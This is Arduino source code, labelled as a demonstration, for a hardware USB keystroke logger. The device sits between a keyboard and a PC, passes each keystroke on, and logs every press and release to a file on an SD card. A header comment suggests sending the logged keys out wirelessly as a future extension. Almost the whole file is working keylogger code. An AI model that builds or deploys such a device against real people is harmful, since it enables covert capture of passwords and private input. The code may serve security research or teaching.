// Author: Junning Fan
/*
 * Demonstration for hardware USB keyboard keystroke logger using off-the-shelf Arduino modules
 * 
 * Hardware components:
 *    1. Arduino Due board
 *    2. SD card module
 *    3. SD card
 *    4. USB-A to Micro USB adapter
 *    
 * Sofrware Functions:
 *    1. To capture USB keyboard inputs, i.e. function as USB master from the perspective of keyboard
 *    2. To repeat the keystrokes from keyboard to PC, i.e. function as a USB HID device from the perspective from PC
 *    3. To record keystrokes to the SD card 
 * 
 * Extensions:
 *    1. Possibly send keystrokes via wireless communication modules?
 */

#include <KeyboardController.h>
#include <Wire.h>
#include <SPI.h>
#include <SD.h>

USBHost usb;
KeyboardController keyboard(usb);

void setup() {
  Serial.begin(9600);
  // put your setup code here, to run once:
  Serial.println("Booting");
  Wire.begin();
  if (!SD.begin(2)) {
    Serial.println("Card failed, or not present");
    // don't do anything more:
    while (1);
  }
  Serial.println("initialized.");
}

void keyPressed() {
  Wire.beginTransmission(0);
  Wire.write('P');
  char keystroke = keyboard.getKey();
  Wire.write(keystroke);
  Wire.endTransmission();
  logKeystroke('P', keystroke);
}

void keyReleased() {
  Wire.beginTransmission(0);
  Wire.write('R');
  char keystroke = keyboard.getKey();
  Wire.write(keystroke);
  Wire.endTransmission();
  logKeystroke('R', keystroke);
}

void loop() {
  // put your main code here, to run repeatedly:
  usb.Task();
}

File keylog;

void logKeystroke(char type, char key) {
  char thisStroke[3];
  thisStroke[2] = '\0';
  thisStroke[1] = key;
  thisStroke[0] = type;
  keylog = SD.open("keylog.txt", FILE_WRITE);
  if(!keylog) {
    Serial.println("Error when opening file");
  }
  keylog.println(thisStroke);
  Serial.println(thisStroke);
  keylog.close();
}
